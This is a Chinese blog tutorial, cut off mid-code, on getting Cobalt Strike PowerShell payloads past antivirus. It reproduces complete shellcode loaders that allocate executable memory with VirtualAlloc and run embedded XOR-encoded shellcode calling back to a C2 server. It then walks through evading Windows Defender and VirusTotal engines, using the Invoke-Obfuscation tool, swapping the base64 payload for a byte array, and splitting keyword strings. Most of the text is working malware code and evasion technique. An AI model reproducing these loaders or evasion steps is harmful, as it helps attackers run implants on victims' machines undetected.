$var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">Param (</span><br><span class="hljs-string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuAPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMeXZPYiMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3dRSkdGTVcMFg0TCgNvYWFxbHRwZnEuKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXfyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEBoNEhMVDRITFw0SEBQjIyMjIw==&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br><span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>分别用Windows Defender测试每一段代码，发现在<code>$var_code</code>中报毒<br>进一步对<code>$var_code</code>解码（我本地base64解出来都是乱码，挺怪的）<br>看别人的结果说能得到一串ASCII字符，而ASCII解码后得到一堆乱码，但在最后，可以发现攻击者的IP，也没什么其他可以获取的信息了</p><blockquote><p>总的来说  powershell的上线方式就是通过VirtualAlloc分配内存然后执行CS的shellcode,shellcode存放在了$var_code变量中</p></blockquote><h2 id="powershell免杀"><a href="#powershell免杀" class="headerlink" title="powershell免杀"></a>powershell免杀</h2><h3 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h3><p>通过对上面hta文件的分析之后，我们知道Windows Defender是对<code>$var_code</code>进行了检测报毒，那我们需要做的就是将该部分进行混淆处理，来绕过Windows Defender的检测<br>这里先推荐一个开源的混淆工具<a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> ./<span class="hljs-built_in">Invoke-Obfuscation</span>.psd1<br><span class="hljs-built_in">Invoke-Obfuscation</span><br></code></pre></td></tr></table></figure><p>根据其步骤安装，运行</p><p><img src="https://s2.loli.net/2022/08/16/4myYitWBsOSNvoJ.png" alt="好酷炫的界面"></p><p>因为没有仔细去研究该工具的使用方法，就直接用的其他大佬的配置<br><code>Set scriptblock &#39;final_base64payload&#39;</code> <code>COMPRESS</code> <code>1</code>,该配置可以绕过Windows Defender，（也可以选择其他混淆方式来绕过不同的防火墙）该工具会根据该配置输出可以绕过Windows Defender的PowerShell命令<br><img src="https://s2.loli.net/2022/08/16/gSbkTOpM3fj1UCV.png"></p><p><code>Out d:payload.ps1</code>将其输出<br><img src="https://s2.loli.net/2022/08/16/CyxmieSZpvrMLEc.png" alt="得到payload.ps1"><br>将其新建的有效载荷替换掉$var_code中的内容，Windows Defender成功绕过</p><p>接着我们把他丢到<a href="https://www.virustotal.com/gui/file/1a2e0851bbae380c43881d70f41835b4a22e74ae2c2daf45593ffb764fc6e9e9?nocache=1">virustotal</a>上看看效果</p><p><img src="https://s2.loli.net/2022/08/16/yg2twhGMiqX6HuQ.png"></p><p><img src="https://s2.loli.net/2022/08/16/EC8iXIbahkVWGSm.png"><br>虽然可以绕过一些大厂的防火墙，例如：微软，腾讯，McAfee<br>但是16/59 感觉还是不太行那我们接下来试试手动免杀</p><h3 id="人工免杀"><a href="#人工免杀" class="headerlink" title="人工免杀"></a>人工免杀</h3><p>我们直接用CS生成一个powershell的payload，不然用之前hta中包含的话，几层base64又压缩啥的太麻烦了<br>先来看看源码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">Param ($var_module, $var_procedure)</span><br><span class="hljs-string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">Param (</span><br><span class="hljs-string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktTjiMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMV0saZCMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3RsdBUXGAN3UUpHRk1XDBYNExgDbmJwYQouKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNicyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhMSDRIQEQ0RERQNEREUIyMjIyM=&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br><span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>与之前的一样，我们需要添加混淆的还是<code>$var_code</code><br>思路是将base64编码换掉，因为base64编码会被杀掉，改成byte数组<br><img src="https://s2.loli.net/2022/08/16/uT4nE71YSL5rpxf.png"></p><p>这可能就是传说中的FromBase65String？<br>将<code>$var_code</code>改掉</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">[Byte[]]$var_code = [Byte[]](<span class="hljs-number">223,203,170,35</span>,<span class="hljs-number">35,35,67,170</span>,<span class="hljs-number">198,18,241,71</span>,<span class="hljs-number">168,113,19,168</span>,<span class="hljs-number">113,47,168,113</span>,<span class="hljs-number">55,168,81,11</span>,<span class="hljs-number">44,148,105,5</span>,<span class="hljs-number">18,220,18,227</span>,<span class="hljs-number">143,31,66,95</span>,<span class="hljs-number">33,15,3,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">193,211,113,116</span>,<span class="hljs-number">168,113,51,168</span>,<span class="hljs-number">97,31,34,243</span>,<span class="hljs-number">168,99,91,166</span>,<span class="hljs-number">227,87,105,34</span>,<span class="hljs-number">243,115,168,107</span>,<span class="hljs-number">59,168,123,3</span>,<span class="hljs-number">34,240,192,31</span>,<span class="hljs-number">106,168,23,168</span>,<span class="hljs-number">34,245,18,220</span>,<span class="hljs-number">18,227,143,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">27,195,86,215</span>,<span class="hljs-number">32,94,219,24</span>,<span class="hljs-number">94,7,86,193</span>,<span class="hljs-number">123,168,123,7</span>,<span class="hljs-number">34,240,69,168</span>,<span class="hljs-number">47,104,168,123</span>,<span class="hljs-number">63,34,240,168</span>,<span class="hljs-number">39,168,34,243</span>,<span class="hljs-number">170,103,7,7</span>,<span class="hljs-number">120,120,66,122</span>,<span class="hljs-number">121,114,220,195</span>,<span class="hljs-number">123,124,121,168</span>,<span class="hljs-number">49,200,165,126</span>,<span class="hljs-number">75,77,70,87</span>,<span class="hljs-number">35,75,84,74</span>,<span class="hljs-number">77,74,119,75</span>,<span class="hljs-number">111,84,5,36</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,116,116,116</span>,<span class="hljs-number">116,75,25,117</span>,<span class="hljs-number">90,132,220,246</span>,<span class="hljs-number">202,167,35,35</span>,<span class="hljs-number">35,120,18,234</span>,<span class="hljs-number">114,114,73,32</span>,<span class="hljs-number">114,114,75,83</span>,<span class="hljs-number">142,35,35,112</span>,<span class="hljs-number">115,75,116,170</span>,<span class="hljs-number">188,229,220,246</span>,<span class="hljs-number">200,83,120,18</span>,<span class="hljs-number">241,113,75,35</span>,<span class="hljs-number">33,99,167,113</span>,<span class="hljs-number">113,113,112,113</span>,<span class="hljs-number">115,75,200,118</span>,<span class="hljs-number">13,24,220,246</span>,<span class="hljs-number">170,229,160,224</span>,<span class="hljs-number">115,18,220,116</span>,<span class="hljs-number">116,73,220,112</span>,<span class="hljs-number">117,75,14,37</span>,<span class="hljs-number">59,88,220,246</span>,<span class="hljs-number">166,227,44,167</span>,<span class="hljs-number">224,34,35,35</span>,<span class="hljs-number">18,220,166,213</span>,<span class="hljs-number">87,39,170,218</span>,<span class="hljs-number">200,42,75,137</span>,<span class="hljs-number">230,193,126,220</span>,<span class="hljs-number">246,170,226,75</span>,<span class="hljs-number">102,2,125,18</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,73,36,114</span>,<span class="hljs-number">117,115,75,148</span>,<span class="hljs-number">116,195,40,220</span>,<span class="hljs-number">246,156,35,12</span>,<span class="hljs-number">35,35,26,228</span>,<span class="hljs-number">87,148,18,220</span>,<span class="hljs-number">202,178,34,35</span>,<span class="hljs-number">35,202,234,34</span>,<span class="hljs-number">35,35,203,168</span>,<span class="hljs-number">220,220,220,12</span>,<span class="hljs-number">87,75,26,100</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,99,98</span>,<span class="hljs-number">115,120,23,127</span>,<span class="hljs-number">115,121,123,22</span>,<span class="hljs-number">23,11,115,125</span>,<span class="hljs-number">10,20,96,96</span>,<span class="hljs-number">10,20,94,7</span>,<span class="hljs-number">102,106,96,98</span>,<span class="hljs-number">113,14,112,119</span>,<span class="hljs-number">98,109,103,98</span>,<span class="hljs-number">113,103,14,98</span>,<span class="hljs-number">109,119,106,117</span>,<span class="hljs-number">106,113,118,112</span>,<span class="hljs-number">14,119,102,112</span>,<span class="hljs-number">119,14,101,106</span>,<span class="hljs-number">111,102,2,7</span>,<span class="hljs-number">107,8,107,9</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,35,118</span>,<span class="hljs-number">80,70,81,14</span>,<span class="hljs-number">98,68,70,77</span>,<span class="hljs-number">87,25,3,110</span>,<span class="hljs-number">76,89,74,79</span>,<span class="hljs-number">79,66,12,22</span>,<span class="hljs-number">13,19,3,11</span>,<span class="hljs-number">64,76,78,83</span>,<span class="hljs-number">66,87,74,65</span>,<span class="hljs-number">79,70,24,3</span>,<span class="hljs-number">110,112,106,102</span>,<span class="hljs-number">3,26,13,19</span>,<span class="hljs-number">24,3,116,74</span>,<span class="hljs-number">77,71,76,84</span>,<span class="hljs-number">80,3,109,119</span>,<span class="hljs-number">3,21,13,18</span>,<span class="hljs-number">24,3,116,108</span>,<span class="hljs-number">116,21,23,24</span>,<span class="hljs-number">3,119,81,74</span>,<span class="hljs-number">71,70,77,87</span>,<span class="hljs-number">12,22,13,19</span>,<span class="hljs-number">24,3,110,98</span>,<span class="hljs-number">112,97,10,46</span>,<span class="hljs-number">41,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,35,75</span>,<span class="hljs-number">211,150,129,117</span>,<span class="hljs-number">220,246,73,99</span>,<span class="hljs-number">75,35,51,35</span>,<span class="hljs-number">35,75,35,35</span>,<span class="hljs-number">99,35,116,75</span>,<span class="hljs-number">123,135,112,198</span>,<span class="hljs-number">220,246,176,154</span>,<span class="hljs-number">35,35,35,35</span>,<span class="hljs-number">34,250,114,112</span>,<span class="hljs-number">170,196,116,75</span>,<span class="hljs-number">35,3,35,35</span>,<span class="hljs-number">112,117,75,49</span>,<span class="hljs-number">181,170,193,220</span>,<span class="hljs-number">246,166,227,87</span>,<span class="hljs-number">229,168,36,34</span>,<span class="hljs-number">224,166,227,86</span>,<span class="hljs-number">198,123,224,203</span>,<span class="hljs-number">138,222,220,220</span>,<span class="hljs-number">18,19,18,13</span>,<span class="hljs-number">18,16,17,13</span>,<span class="hljs-number">17,17,20,13</span>,<span class="hljs-number">17,17,20,35</span>,<span class="hljs-number">35,35,35,35</span>)<br></code></pre></td></tr></table></figure><p>现在再拿到virustotal上面去看看<br><img src="https://s2.loli.net/2022/08/16/WdOi26SaTtkljQG.png"></p><p>离大谱，32/59不得不说，安全厂商估计也是天天在网上学习新的免杀方式</p><p>这里参考了Y4er师傅的处理方法，主要部分就是更改了关键字，</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs dns">Set-StrictMode -Version <span class="hljs-number">2</span><br><br>$DoIt = @&#x27;<br>function func_b &#123;<br>Param ($amodule, $aprocedure)<br>$aunsafe_native_methods = ([AppDomain]<span class="hljs-number">::</span>CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-<span class="hljs-number">1</span>].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.Uns&#x27;+&#x27;afeN&#x27;+&#x27;ativeMethods&#x27;)<br>$agpa = $aunsafe_native_methods.GetMethod(&#x27;GetP&#x27;+&#x27;rocAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))<br>return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($amodule)))), $aprocedure))<br>&#125;<br><br>function func_a &#123;<br>Param (<br>[Parameter(Position = <span class="hljs-number">0</span>, Mandatory = $True)] [Type[]] $aparameters,<br>[Parameter(Position = <span class="hljs-number">1</span>)] [Type] $areturn_type = [Void]<br>)<br><br>$atype_b = [AppDomain]<span class="hljs-number">::</span>CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;Reflect&#x27;+&#x27;edDel&#x27;+&#x27;egate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]<span class="hljs-number">::</span>Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDeleg&#x27;+&#x27;ateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])<br>$atype_b.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]<span class="hljs-number">::</span>Standard, $aparameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)<br>$atype_b.DefineMethod(&#x27;Inv&#x27;+&#x27;oke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $areturn_type, $aparameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)<br><br>return $atype_b.CreateType()<br>&#125;<br><br>[Byte[]]$var_code = [Byte[]](<span class="hljs-number">223,203,170,35</span>,<span class="hljs-number">35,35,67,170</span>,<span class="hljs-number">198,18,241,71</span>,<span class="hljs-number">168,113,19,168</span>,<span class="hljs-number">113,47,168,113</span>,<span class="hljs-number">55,168,81,11</span>,<span class="hljs-number">44,148,105,5</span>,<span class="hljs-number">18,220,18,227</span>,<span class="hljs-number">143,31,66,95</span>,<span class="hljs-number">33,15,3,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">193,211,113,116</span>,<span class="hljs-number">168,113,51,168</span>,<span class="hljs-number">97,31,34,243</span>,<span class="hljs-number">168,99,91,166</span>,<span class="hljs-number">227,87,105,34</span>,<span class="hljs-number">243,115,168,107</span>,<span class="hljs-number">59,168,123,3</span>,<span class="hljs-number">34,240,192,31</span>,<span class="hljs-number">106,168,23,168</span>,<span class="hljs-number">34,245,18,220</span>,<span class="hljs-number">18,227,143,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">27,195,86,215</span>,<span class="hljs-number">32,94,219,24</span>,<span class="hljs-number">94,7,86,193</span>,<span class="hljs-number">123,168,123,7</span>,<span class="hljs-number">34,240,69,168</span>,<span class="hljs-number">47,104,168,123</span>,<span class="hljs-number">63,34,240,168</span>,<span class="hljs-number">39,168,34,243</span>,<span class="hljs-number">170,103,7,7</span>,<span class="hljs-number">120,120,66,122</span>,<span class="hljs-number">121,114,220,195</span>,<span class="hljs-number">123,124,121,168</span>,<span class="hljs-number">49,200,165,126</span>,<span class="hljs-number">75,77,70,87</span>,<span class="hljs-number">35,75,84,74</span>,<span class="hljs-number">77,74,119,75</span>,<span 